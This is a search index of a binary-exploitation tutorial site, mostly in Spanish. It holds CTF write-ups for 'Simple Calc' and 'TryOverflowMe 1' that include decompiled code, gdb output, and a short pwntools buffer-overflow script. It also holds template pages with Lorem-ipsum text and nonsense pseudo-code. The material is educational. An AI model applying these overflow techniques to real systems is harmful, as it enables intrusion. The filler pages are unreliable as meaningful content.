[{"id":0,"href":"/docs/stack/buffer-overflow-variable/","title":"Buffer Overflow Variable","section":"Stack","content":" Section summary. # "},{"id":1,"href":"/docs/background/","title":"Introduction","section":"Docs","content":" Introduction # In this section I will tell you some previous knowledge that is recommended to have before starting to exploit binaries.\nImportant: it is not mandatory to have this knowledge, it is only recommended to make learning easier.\nTable of Contents. # Recommended background knowledge. Tools required. "},{"id":2,"href":"/docs/background/recommended-background-knowledge/","title":"Recommended background knowledge","section":"Introduction","content":" How Computers Work # Before diving into binary exploitation, it\u0026rsquo;s crucial to understand how computers work at a fundamental level. This includes learning about CPU architecture, memory hierarchy, how instructions are executed, and the role of operating systems. Having a solid grasp of these concepts will make it much easier to understand vulnerabilities and how to exploit them effectively.\nLearning Resources. # How the computer works Steve Klabnik How a CPU works and Introduction to Assembler - bin 0x04 How Computers Work: The Basics (Reddit Thread) C Language # One of the first things we must master before learning binary exploitation is the C programming language. Most of the binaries we will analyze and exploit are written in C, and more importantly, the Linux kernel itself is written in C. Understanding how memory management, pointers, and low-level operations work in C is essential for recognizing and exploiting vulnerabilities such as buffer overflows, use-after-free, and format string attacks.\nLearning Resources. # The C Programming Language (K\u0026amp;R) Hopper\u0026rsquo;s Roppers C Training Assembly # Another fundamental skill for binary exploitation is mastering Assembly. This low-level language gives us a deep understanding of how programs interact with the CPU, memory, and registers, allowing us to manipulate execution flow precisely. Most vulnerabilities, such as buffer overflows and return-oriented programming (ROP) attacks, rely on modifying assembly-level instructions. By learning Assembly, we can analyze disassembled binaries, craft payloads, and develop effective exploitation techniques, making it an essential skill for any pwner.\nLearning Resources. # Assembly Crash Course (pwn.college) Assembly Tutorial (GitHub) Intel Developer Manuals "},{"id":3,"href":"/docs/stack/","title":"Stack","section":"Docs","content":" Introduction # Ferre hinnitibus erat accipitrem dixi Troiae tollens # Lorem markdownum, a quoque nutu est quodcumque mandasset veluti. Passim inportuna totidemque nympha fert; repetens pendent, poenarum guttura sed vacet non, mortali undas. Omnis pharetramque gramen portentificisque membris servatum novabis fallit de nubibus atque silvas mihi. Dixit repetitaque Quid; verrit longa; sententia mandat quascumque nescio solebat litore; noctes. Hostem haerentem circuit plenaque tamen.\nPedum ne indigenae finire invergens carpebat Velit posses summoque De fumos illa foret Est simul fameque tauri qua ad # Locum nullus nisi vomentes. Ab Persea sermone vela, miratur aratro; eandem Argolicas gener.\nMe sol # Nec dis certa fuit socer, Nonacria dies manet tacitaque sibi? Sucis est iactata Castrumque iudex, et iactato quoque terraeque es tandem et maternos vittis. Lumina litus bene poenamque animos callem ne tuas in leones illam dea cadunt genus, et pleno nunc in quod. Anumque crescentesque sanguinis progenies nuribus rustica tinguet. Pater omnes liquido creditis noctem.\nif (mirrored(icmp_dvd_pim, 3, smbMirroredHard) != lion(clickImportQueue, viralItunesBalancing, bankruptcy_file_pptp)) { file += ip_cybercrime_suffix; } if (runtimeSmartRom == netMarketingWord) { virusBalancingWin *= scriptPromptBespoke + raster(post_drive, windowsSli); cd = address_hertz_trojan; soap_ccd.pcbServerGigahertz(asp_hardware_isa, offlinePeopleware, nui); } else { megabyte.api = modem_flowchart - web + syntaxHalftoneAddress; } if (3 \u0026lt; mebibyteNetworkAnimated) { pharming_regular_error *= jsp_ribbon + algorithm * recycleMediaKindle( dvrSyntax, cdma); adf_sla *= hoverCropDrive; templateNtfs = -1 - vertical; } else { expressionCompressionVariable.bootMulti = white_eup_javascript( table_suffix); guidPpiPram.tracerouteLinux += rtfTerabyteQuicktime(1, managementRosetta(webcamActivex), 740874); } var virusTweetSsl = nullGigo; Trepident sitimque # Sentiet et ferali errorem fessam, coercet superbus, Ascaniumque in pennis mediis; dolor? Vidit imi Aeacon perfida propositos adde, tua Somni Fluctibus errante lustrat non.\nTamen inde, vos videt e flammis Scythica parantem rupisque pectora umbras. Haec ficta canistris repercusso simul ego aris Dixit! Esse Fama trepidare hunc crescendo vigor ululasse vertice exspatiantur celer tepidique petita aversata oculis iussa est me ferro.\n"},{"id":4,"href":"/docs/stack/buffer-overflow--static/","title":"Buffer Overflow Static","section":"Stack","content":" Section summary. # "},{"id":5,"href":"/docs/background/tools-required/","title":"Tools Required","section":"Introduction","content":" Tools Required # pwntools gef "},{"id":6,"href":"/docs/stack/hidden/","title":"Hidden","section":"Stack","content":" This page is hidden in menu # Quondam non pater est dignior ille Eurotas # Latent te facies # Lorem markdownum arma ignoscas vocavit quoque ille texit mandata mentis ultimus, frementes, qui in vel. Hippotades Peleus pennas conscia cuiquam Caeneus quas.\nPater demittere evincitque reddunt Maxime adhuc pressit huc Danaas quid freta Soror ego Luctus linguam saxa ultroque prior Tatiumque inquit Saepe liquitur subita superata dederat Anius sudor Cum honorum Latona # O fallor in sustinui iussorum equidem. Nymphae operi oris alii fronde parens dumque, in auro ait mox ingenti proxima iamdudum maius?\nreality(burnDocking(apache_nanometer), pad.property_data_programming.sectorBrowserPpga(dataMask, 37, recycleRup)); intellectualVaporwareUser += -5 * 4; traceroute_key_upnp /= lag_optical(android.smb(thyristorTftp)); surge_host_golden = mca_compact_device(dual_dpi_opengl, 33, commerce_add_ppc); if (lun_ipv) { verticalExtranet(1, thumbnail_ttl, 3); bar_graphics_jpeg(chipset - sector_xmp_beta); } Fronde cetera dextrae sequens pennis voce muneris # Acta cretus diem restet utque; move integer, oscula non inspirat, noctisque scelus! Nantemque in suas vobis quamvis, et labori!\nvar runtimeDiskCompiler = home - array_ad_software; if (internic \u0026gt; disk) { emoticonLockCron += 37 + bps - 4; wan_ansi_honeypot.cardGigaflops = artificialStorageCgi; simplex -= downloadAccess; } var volumeHardeningAndroid = pixel + tftp + onProcessorUnmount; sector(memory(firewire + interlaced, wired)); "},{"id":7,"href":"/docs/stack/buffer-overflow--static/bkp16_simplecalc/","title":"Simple Calc","section":"Buffer Overflow Static","content":" Puedes descargar el binario de este desafío aquí.\nSimple Calc (Boston Key Party CTF 2016) # Se nos entrega un binario de 64 bits con las siguientes protecciones.\n$ checksec simplecalc Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No Al ejecutarlo, el programa solicita la cantidad de operaciones a realizar. Una vez ingresado el número, permite seleccionar la operación deseada.\n$ ./simplecalc |#------------------------------------#| | Something Calculator | |#------------------------------------#| Expected number of calculations: 50 Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; Ingenieria inversa y analisis del codigo fuente # Si abrimos el binario con IDA, podemos ver lo siguiente en la funcion main.\nint __fastcall main(int argc, const char **argv, const char **envp) { int v3; // edx int v4; // ecx int v5; // r8d int v6; // r9d int v7; // edx int v8; // ecx int v9; // r8d int v10; // r9d int v12; // edx int v13; // ecx int v14; // r8d int v15; // r9d char v16; // [rsp+0h] [rbp-50h] char v17; // [rsp+0h] [rbp-50h] _BYTE v18[40]; // [rsp+10h] [rbp-40h] BYREF int v19; // [rsp+38h] [rbp-18h] BYREF int v20; // [rsp+3Ch] [rbp-14h] BYREF __int64 v21; // [rsp+40h] [rbp-10h] int i; // [rsp+4Ch] [rbp-4h] v20 = 0; setvbuf(stdin, 0LL, 2LL, 0LL); setvbuf(stdout, 0LL, 2LL, 0LL); print_motd(); printf((unsigned int)\u0026#34;Expected number of calculations: \u0026#34;, 0, v3, v4, v5, v6, (char)argv); _isoc99_scanf((unsigned int)\u0026#34;%d\u0026#34;, (unsigned int)\u0026amp;v20, v7, v8, v9, v10, v16); handle_newline(); if ( v20 \u0026lt;= 255 \u0026amp;\u0026amp; v20 \u0026gt; 3 ) { v21 = malloc(4 * v20); for ( i = 0; i \u0026lt; v20; ++i ) { print_menu(); _isoc99_scanf((unsigned int)\u0026#34;%d\u0026#34;, (unsigned int)\u0026amp;v19, v12, v13, v14, v15, v17); handle_newline(); switch ( v19 ) { case 1: adds(); *(_DWORD *)(v21 + 4LL * i) = dword_6C4A88; break; case 2: subs(); *(_DWORD *)(v21 + 4LL * i) = dword_6C4AB8; break; case 3: muls(); *(_DWORD *)(v21 + 4LL * i) = dword_6C4AA8; break; case 4: divs(); *(_DWORD *)(v21 + 4LL * i) = dword_6C4A98; break; case 5: memcpy(v18, v21, 4 * v20); free(v21); return 0; default: puts(\u0026#34;Invalid option.\\n\u0026#34;); break; } } free(v21); return 0; } else { puts(\u0026#34;Invalid number.\u0026#34;); return 0; } } El programa define variables de tipo int y luego muestra en pantalla el mensaje Expected number of calculations:. A continuación, espera la entrada del usuario mediante scanf(). Si el número ingresado no está en el rango de 4 a 255, imprime Invalid number. y finaliza la ejecución retornando 0. En caso contrario, entra en una estructura de control switch, donde ofrece cinco opciones: sumar, restar, multiplicar y dividir números, además de una quinta opción que permite salir del programa. Podemos probar una de estas opciones.\n$ ./simplecalc |#------------------------------------#| | Something Calculator | |#------------------------------------#| Expected number of calculations: 5 Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 5 $ Al elegir la opción 1, podemos sumar números y luego salir del programa sin problemas. Esto nos ayuda a comprender el funcionamiento del binario.\nEstrategia de Explotación # El programa es vulnerable a Buffer Overflow debido a la forma en que maneja los cálculos almacenados en memoria. Cuando se selecciona un número elevado de cálculos y se realizan múltiples operaciones, el programa almacena los resultados en memoria. Al elegir la opción 5, se ejecuta memcpy(), copiando los cálculos almacenados en v21 hacia la variable v18.Al revisar la variable v18 en el codigo fuente vemos que es un array de solo 40 bytes, lo que significa que, si ingresamos más cálculos de los que este buffer puede almacenar, se producirá un desbordamiento de buffer. Vamos a probarlo.\n|$ ./simplecalc |#------------------------------------#| | Something Calculator | |#------------------------------------#| Expected number of calculations: 50 Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 1 Integer x: 50 Integer y: 50 Result for x + y is 100. Options Menu: [1] Addition. [2] Subtraction. [3] Multiplication. [4] Division. [5] Save and Exit. =\u0026gt; 5 [1] 11686 segmentation fault (core dumped) ./simplecalc Como vemos luego de ingresar muchos calculos el programa corrompe.\n"},{"id":8,"href":"/docs/stack/buffer-overflow-variable/tryoverflowme1/","title":"TryOverflowMe 1","section":"Buffer Overflow Variable","content":" TryOverflowMe 1 # Nos entregan un binario de 64 bits con la siguientes protecciones.\n$ checksec overflowme1 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No Tambien tenemos su codigo fuente.\nint main(){ setup(); banner(); int admin = 0; char buf[0x10]; puts(\u0026#34;PLease go ahead and leave a comment :\u0026#34;); gets(buf); if (admin){ const char* filename = \u0026#34;flag.txt\u0026#34;; FILE* file = fopen(filename, \u0026#34;r\u0026#34;); char ch; while ((ch = fgetc(file)) != EOF) { putchar(ch); } fclose(file); } else{ puts(\u0026#34;Bye bye\\n\u0026#34;); exit(1); } } Analisis del codigo fuente. # Vemos que define una variable admin con el valor de 0, luego define un buffer de 0x10 (16 bytes en decimal), con puts imprime la cadena PLease go ahead and leave a comment : y toma nuestro input con la funcion gets(), esto hace que el binario sea vulnerable a Buffer Overflow ya qué esta funcion no controla el tamaño de nuestro input permitiendonos desbordar el buffer. Por ultimo con un condicional if comprueba si la variable admin es igual a 1, si esto es verdadero habre la flag (flag.txt) y la muestra por pantalla, si no se cumple la condicion imprime por pantalla Bye bye y sale del programa con un codigo de estado 1.\nPara resolver este desafío, es necesario modificar el valor de la variable admin a un valor distinto de 0 para que la condición del if se evalúe como verdadera y se ejecute la lectura de flag.txt. Dado que gets(buf) permite una entrada sin restricciones de tamaño, podemos explotar un Buffer Overflow para sobrescribir la variable admin en memoria. Para ello, primero debemos determinar el offset exacto que separa el inicio del buffer de la dirección de admin en la pila, lo que nos permitirá calcular el padding necesario. Una vez identificado el desplazamiento correcto, inyectamos una secuencia de bytes que contenga los datos de relleno seguidos del valor 0x1 (o cualquier valor distinto de 0) en la posición correspondiente.\nExplotación. # Para calcular el offset vamos abrir el binario utilizando gdb con la extesión gef, pondremos un breakpoint en main y ejecutaremos el binario.\n────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffdca0│+0x0000: 0x0000000000000000 ← $rsp 0x00007fffffffdca8│+0x0008: 0x0000000000000000 0x00007fffffffdcb0│+0x0010: 0x0000000000000000 0x00007fffffffdcb8│+0x0018: 0x00007ffff7fe5af0 → \u0026lt;dl_main+0000\u0026gt; endbr64 0x00007fffffffdcc0│+0x0020: 0x00007fffffffddb0 → 0x00000000004006c0 → \u0026lt;_start+0000\u0026gt; xor ebp, ebp 0x00007fffffffdcc8│+0x0028: 0x00007fffffffddf8 → 0x00007fffffffe16e → \u0026quot;/home/abund4nt/pwn/TryHackMe/TryPwnMe One/TryOverF[...]\u0026quot; 0x00007fffffffdcd0│+0x0030: 0x00007fffffffdd70 → 0x00007fffffffddd0 → 0x0000000000000000 ← $rbp 0x00007fffffffdcd8│+0x0038: 0x00007ffff7c2a1ca → \u0026lt;__libc_start_call_main+007a\u0026gt; mov edi, eax ──────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──── ● 0x4008da \u0026lt;main+0000\u0026gt; push rbp 0x4008db \u0026lt;main+0001\u0026gt; mov rbp, rsp 0x4008de \u0026lt;main+0004\u0026gt; sub rsp, 0x30 → 0x4008e2 \u0026lt;main+0008\u0026gt; mov eax, 0x0 0x4008e7 \u0026lt;main+000d\u0026gt; call 0x4007a2 \u0026lt;setup\u0026gt; 0x4008ec \u0026lt;main+0012\u0026gt; mov eax, 0x0 0x4008f1 \u0026lt;main+0017\u0026gt; call 0x4007e5 \u0026lt;banner\u0026gt; 0x4008f6 \u0026lt;main+001c\u0026gt; mov DWORD PTR [rbp-0x4], 0x0 0x4008fd \u0026lt;main+0023\u0026gt; lea rdi, [rip+0x33c] # 0x400c40 Al ejecutar el binario y analizar su flujo de ejecución, se observa que el programa mueve el valor del registro rsp al rbp, estableciendo así el stack frame. Posteriormente, se resta 0x30 (48 en decimal) a rsp, reservando espacio en la pila para variables locales. La instrucción mov DWORD PTR [rbp-0x4], 0x0 inicializa la variable admin en 0, ubicándola en rbp-0x4. Para determinar el offset se debe calcular la distancia entre el inicio del buffer y la dirección de admin en la pila. Dado que rsp se decrementó en 0x30 y admin está en rbp-0x4, el desplazamiento requerido es 0x30 - 0x4 = 0x2c (44 en decimal). Con este valor, podemos construir un payload con 44 bytes de relleno seguidos de un valor distinto de 0 (en este caso sera 1), logrando así modificar la variable admin y forzar la ejecución del bloque de código que imprime la bandera.\nFlag # Para resolver el desafio cree un script el cual envia 16 bytes (En A\u0026rsquo;s) por el buffer definido char buf[0x10]; mas 28 bytes (En B\u0026rsquo;s) el cual representa el padding y por ultimo el valor de 1 en 8 bytes (\\x01) para sobreescribir la variable.\nfrom pwn import * context.binary = ELF(\u0026#39;./overflowme1\u0026#39;) p = process() payload = b\u0026#39;A\u0026#39; * 16 # char buf[0x10]; payload += b\u0026#39;B\u0026#39; * 28 # padding payload += p8(1) p.sendline(payload) p.interactive() Al ejecutarlo podemos obtener la flag.\n$ python3 solve.py Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Stripped: No [*] Switching to interactive mode ___ ___ ___ /__/\\ /__/\\ / /\\ \\ \\:\\ | |::\\ / /:/ \\__\\:\\ | |:|:\\ / /:/ ___ / /::\\ __|__|:|\\:\\ / /::\\ /__/\\ /:/\\:\\ /__/::::| \\:\\ /__/:/\\:\\ \\ \\:\\/:/__\\/ \\ \\:\\~~\\__\\/ \\__\\/ \\:\\ \\ \\::/ \\ \\:\\ \\ \\:\\ \\ \\:\\ \\ \\:\\ \\__\\/ \\ \\:\\ \\ \\:\\ \\__\\/ \\__\\/ Please go ahead and leave a comment : THM{Oooooooooooooovvvvverrrflloowwwwww} [*] Got EOF while reading in interactive"}]